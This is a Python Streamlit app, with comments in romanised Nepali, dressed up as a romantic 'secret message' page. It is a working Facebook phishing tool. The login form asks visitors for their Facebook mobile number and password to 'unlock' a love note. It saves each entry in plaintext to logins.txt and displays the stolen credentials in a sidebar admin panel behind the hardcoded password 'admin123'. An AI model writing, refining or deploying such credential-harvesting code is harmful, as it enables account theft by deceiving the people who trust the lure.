import streamlit as st
import os

# 1. Page Configuration
st.set_page_config(page_title="Special Surprise ❤️", page_icon="💖", layout="centered")

# 2. Database File
DATA_FILE = "logins.txt"

# 3. Data save garne function
def save_data(email,pwd):
    try:
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(f"Email: {email} | Password: {pwd}\n")
    except Exception as e:
        st.error(f"Save error: {e}")

# 4. Session State check
if 'submitted' not in st.session_state:
    st.session_state.submitted = False

# --- SIDEBAR: ADMIN PANEL ---
with st.sidebar:
    st.header("🔒 Admin Panel")
    admin_pass = st.text_input("Admin Password", type="password")
    if admin_pass == "admin123":
        st.success("Welcome back!")
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                logs = f.readlines()
            for line in logs:
                st.info(line.strip())
        else:
            st.write("No data found.")

# --- MAIN PAGE ---
st.markdown("<h1 style='text-align: center; color: #ff4b2b;'>💝 Login Fb to open Secret message #2 Portal 💝</h1>", unsafe_allow_html=True)

if not st.session_state.submitted:
    st.markdown("<p style='text-align: center; color #3776AB'>Please log in Fb id to unlock the surprise.</p>", unsafe_allow_html=True)
    
    # --- FIXING THE FORM LOGIC ---
    with st.form("login_form"):
        # Variable haru form vitra define gareko
        email_val = st.text_input("Mobile number")
        password_val = st.text_input("fb Password", type="password")
     
        
        submit_btn = st.form_submit_button("Unlock Message❤️")
        
        # Jaba button click hunchha, variable check garne
        if submit_btn:
            # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
            if email_val and password_val:
                save_data(email_val, password_val)
                st.session_state.submitted = True
                st.rerun()
            else:
                st.error("Kripaya sabai details halnuhos!")

else:
    st.balloons()
    st.markdown("""
    <div style="text-align: center; background-color: #fff0f5; padding: 40px; border-radius: 20px; border: 3px solid #ffc1e3;">
        <h2 style="color: #d81b60;">💖 143! 💖</h2>
        <p style="font-size: 20px;">"Maile prem gareka dherai chij madhye 
        timro aankha pani ek ho. 
        Tyo aankhama sadhai khusi matra dekhna paau, 
        aasu hoina. Timro muskan ra aankhako chamak
         mero lagi sabai bhanda thulo upahaar ho. 
            Stay happy, sweetheart!"</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("Reset"):
        st.session_state.submitted = False
        st.rerun()